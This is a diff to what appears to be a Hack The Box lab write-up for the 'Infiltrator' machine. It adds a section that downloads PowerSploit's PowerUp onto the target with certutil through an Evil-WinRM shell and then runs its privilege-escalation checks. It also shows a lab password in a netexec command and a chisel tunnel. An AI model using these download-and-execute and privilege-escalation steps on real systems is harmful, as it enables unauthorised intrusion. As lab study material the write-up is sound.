@@ -1481,9 +1481,101 @@ User        : LocalSystem
 StartMode   : Automatic
 ```
 
-### 6.2. Finding another way
+### 6.2. PowerUp
 
-The PrivescCheck didn't reveal much, let's go check the users again
+#### Prepare Kali
+
+```sh
+curl -Lo /var/www/html/Get-System.ps1 https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/Get-System.ps1
+curl -Lo /var/www/html/PowerUp.ps1 https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/PowerUp.ps1
+curl -Lo /var/www/html/Privesc.psd1 https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/Privesc.psd1
+curl -Lo /var/www/html/Privesc.psm1 https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/Privesc.psm1
+```
+
+#### Download and run on target
+
+```cmd
+*Evil-WinRM* PS C:\Users\M.harris\Documents> certutil.exe -urlcache -f -split http://10.10.14.35/Get-System.ps1
+****  Online  ****
+  0000  ...
+  6890
+CertUtil: -URLCache command completed successfully.
+*Evil-WinRM* PS C:\Users\M.harris\Documents> certutil.exe -urlcache -f -split http://10.10.14.35/PowerUp.ps1
+****  Online  ****
+  000000  ...
+  092a04
+CertUtil: -URLCache command completed successfully.
+*Evil-WinRM* PS C:\Users\M.harris\Documents> certutil.exe -urlcache -f -split http://10.10.14.35/Privesc.psd1
+****  Online  ****
+  0000  ...
+  067b
+CertUtil: -URLCache command completed successfully.
+*Evil-WinRM* PS C:\Users\M.harris\Documents> certutil.exe -urlcache -f -split http://10.10.14.35/Privesc.psm1
+****  Online  ****
+  0000  ...
+  0043
+CertUtil: -URLCache command completed successfully.
+*Evil-WinRM* PS C:\Users\M.harris\Documents> Set-ExecutionPolicy Bypass -Scope CurrentUser
+*Evil-WinRM* PS C:\Users\M.harris\Documents> Import-Module .\Privesc.psm1
+*Evil-WinRM* PS C:\Users\M.harris\Documents> Invoke-AllChecks
+Access denied
+At C:\Users\M.harris\Documents\PowerUp.ps1:2066 char:21
++     $VulnServices = Get-WmiObject -Class win32_service | Where-Object ...
++                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
+    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand
+Access denied
+At C:\Users\M.harris\Documents\PowerUp.ps1:2133 char:5
++     Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pat ...
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
+    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand
+Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
+At C:\Users\M.harris\Documents\PowerUp.ps1:2189 char:5
++     Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeCo ...
++     ~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException
+    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand
+Access is denied
+At C:\Users\M.harris\Documents\PowerUp.ps1:857 char:43
++ ...                 if ($ParentPath -and (Test-Path -Path $ParentPath)) {
++                                           ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Program File...\Output\apache2:String) [Test-Path], UnauthorizedAccessException
+    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.TestPathCommand
+Access is denied
+At C:\Users\M.harris\Documents\PowerUp.ps1:857 char:43
++ ...                 if ($ParentPath -and (Test-Path -Path $ParentPath)) {
++                                           ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Program File...\Plugins\Output:String) [Test-Path], UnauthorizedAccessException
+    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.TestPathCommand
+Access is denied
+At C:\Users\M.harris\Documents\PowerUp.ps1:857 char:43
++ ...                 if ($ParentPath -and (Test-Path -Path $ParentPath)) {
++                                           ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Program File...ns\Output\mysql:String) [Test-Path], UnauthorizedAccessException
+    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.TestPathCommand
+
+
+ModifiablePath    : C:\Users\M.harris\AppData\Local\Microsoft
+IdentityReference : INFILTRATOR\M.harris
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+%PATH%            : C:\Users\M.harris\AppData\Local\Microsoft\WindowsApps
+Name              : C:\Users\M.harris\AppData\Local\Microsoft\WindowsApps
+Check             : %PATH% .dll Hijacks
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\M.harris\AppData\Local\Microsoft\wlbsctrl.dll'
+
+DefaultDomainName    : INFILTRATOR
+DefaultUserName      : Administrator
+DefaultPassword      :
+AltDefaultDomainName :
+AltDefaultUserName   :
+AltDefaultPassword   :
+Check                : Registry Autologons
+```
+
+### 6.3. Finding another way
+
+The PowerUp and PrivescCheck didn't reveal much, let's go check the users again
 
 ```console
 root@kali:~# netexec ldap infiltrator.htb -u l.clark -p 'WAT?watismypass!' --users
@@ -1577,7 +1669,7 @@ Let's see what ports are the target listening on
 ⋮
 ```
 
-#### 6.2.1. Establish Chisel connection
+#### 6.3.1. Establish Chisel connection
 
 Start chisel listener on Kali
 
@@ -1628,6 +1720,8 @@ Kali should show connected:
 2024/12/26 22:06:17 server: session#1: tun: proxy#R:14130=>14130: Listening
 2024/12/26 22:06:17 server: session#1: tun: proxy#R:14406=>14406: Listening
 ```
+
+#### 6.3.2. Exploring
 
 Do a nmap scan on the mapped ports:
 
